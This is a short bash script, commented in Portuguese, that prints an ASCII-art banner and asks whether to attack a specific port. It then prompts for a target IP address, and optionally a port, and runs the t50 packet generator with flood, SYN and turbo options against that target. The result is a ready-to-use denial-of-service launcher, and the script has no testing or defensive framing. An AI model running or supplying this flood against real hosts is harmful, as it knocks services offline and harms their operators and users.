#!/bin/bash

echo " "
echo " "
echo "       *                                                   *"
echo "      *                                                     *"
echo "    **                                                       **"
echo "*   **                                                       **   *"
echo "**   **          *                               *          **   **"
echo "***    *         **                             **         *    ***"
echo " ****            *********************************            ****"
echo "   *******      ***           *******           ***      *******"
echo "      ************             *****             ************"
echo "         **********    **** * **   ** *******   **********"
echo "               ********** ** **     ** ****************"
echo "         *************** ** **  ***  **  *****************"
echo "          ******   *********************  ******   ******"
echo "                    **********************  ***"
echo "                    ************************ **"
echo "                     **** ** ** **** ** ** **"
echo "                      ***  *  *  **  *  *  ***"
echo "                       **                  **"
echo "                         *                *"
echo " "
echo "Deseja fazer o ataque em uma porta especifica?"
read -p "S/N > " escolha01

case "$escolha01" in
	S)
		read -p "ip: " ip01
		read -p "porta: " port01
		t50 $ip01 --flood -S --turbo --protocol t50 --dport $port01
	;;

	N)
		read -p "ip: " ip50
		t50 $ip50 --flood -S --turbo --protocol t50 
	;;

esac
